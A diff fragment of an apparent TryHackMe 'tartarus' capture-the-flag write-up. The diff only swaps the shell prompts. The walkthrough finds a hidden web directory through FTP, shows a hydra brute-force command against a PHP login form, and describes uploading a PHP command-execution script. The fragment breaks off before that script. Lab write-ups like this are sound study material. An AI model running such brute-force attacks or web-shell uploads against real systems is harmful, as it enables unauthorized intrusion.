@@ -41,14 +41,14 @@ ftp> ls ...
 ```
 grab the file. it is containt a hidden web directory!!
 ```
-kali@kali:~/THM/tartarus$ cat test.txt 
+bibo318@parrot:~/THM/tartarus$ cat test.txt 
 vsftpd test file
-kali@kali:~/THM/tartarus$ cat yougotgoodeyes.txt 
+bibo318@parrot:~/THM/tartarus$ cat yougotgoodeyes.txt 
 /sUp3r-______
 ```
 `/sUp3r-______` contains a login page. Let use hydra to brute force using `userid` and `credential.txt` as username and password
 ```
-kali@kali:~/THM/tartarus$ hydra -t 64 -L userid -P credentials.txt $IP http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
+bibo318@parrot:~/THM/tartarus$ hydra -t 64 -L userid -P credentials.txt $IP http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
 ```
 user the credential obtained from hydra to log into `/sUp3r-s3cr3t/` note that you can upload files which will appreas at `/sUp3r-s3cr3t/images/uploads/`. I then try to upload a php srcipt which execute a os command base on a given argurment.
 ```php
